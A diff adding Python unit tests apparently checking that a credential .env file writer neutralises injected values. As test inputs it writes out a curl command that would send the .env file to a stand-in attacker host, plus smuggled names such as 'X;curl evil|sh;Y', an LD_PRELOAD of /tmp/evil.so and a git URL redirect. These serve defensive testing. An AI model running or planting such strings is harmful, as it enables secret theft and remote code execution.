@@ -64,6 +64,37 @@ def test_assemble_env_bytes_quotes_a_value_that_needs_it() -> None:
     ), "a value with newlines is double-quoted and escaped so it can be read back"
 
 
+def test_assemble_env_bytes_single_quotes_a_value_bash_would_expand() -> None:
+    rows = [_row("NOTE", "$(curl -s evil.example -d @/mnt/session/uploads/.env)")]
+    assert assemble_env_bytes(rows) == (
+        b"NOTE='$(curl -s evil.example -d @/mnt/session/uploads/.env)'\n"
+    ), "the file is sourced by bash, so command substitution must be inert"
+
+
+def test_assemble_env_bytes_leaves_out_rows_stored_under_an_unsafe_name() -> None:
+    rows = [
+        _row("OK", "1"),
+        _row("LD_PRELOAD", "/tmp/evil.so"),
+        _row("GIT_CONFIG_KEY_0", "url.https://evil.example/.insteadOf"),
+        _row("X;curl evil|sh;Y", "1"),
+        _row("NUL_VALUE", "a\0b"),
+        _row("AFTER", "2"),
+    ]
+    with structlog.testing.capture_logs() as logs:
+        assembled = assemble_env_bytes(rows)
+    assert assembled == b"OK=1\nAFTER=2\n", (
+        "a row stored before the name rule existed must never be exported"
+    )
+    skipped = [log for log in logs if log["event"] == "credential_env.row_skipped"]
+    assert [log["key"] for log in skipped] == [
+        "LD_PRELOAD",
+        "GIT_CONFIG_KEY_0",
+        "X;curl evil|sh;Y",
+        "NUL_VALUE",
+    ]
+    assert all("evil.so" not in str(log) for log in skipped), "values are never logged"
+
+
 def test_assemble_env_bytes_unicode_roundtrips_byte_exact() -> None:
     value = "café-π-密钥"
     rows = [_row("UNICODE", value)]
